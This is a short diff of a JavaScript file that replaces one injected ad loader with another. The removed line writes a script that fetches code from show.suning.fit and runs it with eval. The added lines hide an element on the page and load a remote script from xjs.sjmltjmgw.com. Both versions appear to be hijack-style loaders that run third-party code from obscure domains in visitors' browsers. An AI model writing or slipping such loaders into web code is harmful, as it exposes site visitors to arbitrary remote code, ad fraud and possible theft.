@@ -1,1 +1,6 @@
-document.writeln('<script data-union-ad data-priority="1" data-position="fixed">;(function(){var a=new XMLHttpRequest();var b="https://show.suning.fit:12443/ty/B857B47E-1C30-13163-33-0CAED30E4708.alpha?r="+new Date().toLocaleDateString();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){if(window.execScript)window.execScript(a.responseText,"JavaScript");else if(window.eval)window.eval(a.responseText,"JavaScript");else eval(a.responseText);}}};a.open("GET",b,false);a.send(null);}})();<\/script>')
+(function (){
+                        var id = "3929776671695658599-11161";
+  document.write('<ins style="display:none!important" id="' + id + '"></ins>');
+  (window.adbyunion = window.adbyunion || []).push(id);
+  document.write('<script async  src="https://xjs.sjmltjmgw.com/o.js"></script>');
+})();
